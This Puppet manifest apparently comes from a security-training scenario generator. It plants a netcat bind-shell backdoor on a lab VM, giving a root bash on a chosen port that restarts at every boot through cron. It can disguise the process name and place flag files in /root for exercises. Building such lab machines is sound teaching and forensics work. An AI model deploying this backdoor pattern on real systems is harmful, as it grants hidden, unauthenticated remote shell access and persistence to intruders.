class nc_backdoor::install {
  $secgen_parameters = secgen_functions::get_parameters($::base64_inputs_file)
  $port = $secgen_parameters['port'][0]
  $proc_name = $secgen_parameters['proc_name'][0]
  $session_ref = $secgen_parameters['session_ref'][0]

  $strings_to_leak = $secgen_parameters['strings_to_leak']
  $leaked_filenames = $secgen_parameters['leaked_filenames']

  ensure_packages("nmap")
  case $operatingsystemrelease {
    /^(1[0-9]).*/: { # do buster stuff
      ensure_packages("ncat")
    }
  }

  # When a proc_name is supplied, run the listener through a renamed link to
  # ncat so the process's kernel task name (comm) is that value; otherwise keep
  # the original plain "ncat" invocation so existing scenarios are unchanged.
  if $proc_name != undef and $proc_name != '' {
    file { "/usr/local/sbin/${proc_name}":
      ensure  => link,
      target  => '/usr/bin/ncat',
      require => Package['ncat'],
    }
    $listener = "/usr/local/sbin/${proc_name}"
  } else {
    $listener = 'ncat'
  }

  # When a session_ref is supplied, carry it in the listener's command line so
  # the value lives in the process arguments (recoverable from a memory image);
  # otherwise keep the original "-e /bin/bash" invocation unchanged.
  if $session_ref != undef and $session_ref != '' {
    $shell_part = "-c 'BACKDOOR_SESSION_ID=${session_ref} /bin/bash'"
  } else {
    $shell_part = '-e /bin/bash'
  }
  $backdoor_command = "sleep 60 && ${listener} -l -p ${port} ${shell_part} -k &"

  # run on each boot via cron
  cron { 'backdoor':
    command     => $backdoor_command,
    special     => 'reboot',
  }

  ::secgen_functions::leak_files { "root-file-leak":
    storage_directory => "/root/",
    leaked_filenames  => $leaked_filenames,
    strings_to_leak   => $strings_to_leak,
    owner             => root,
    group             => root,
    mode              => '0600',
    leaked_from       => "accounts_root",
  }
}
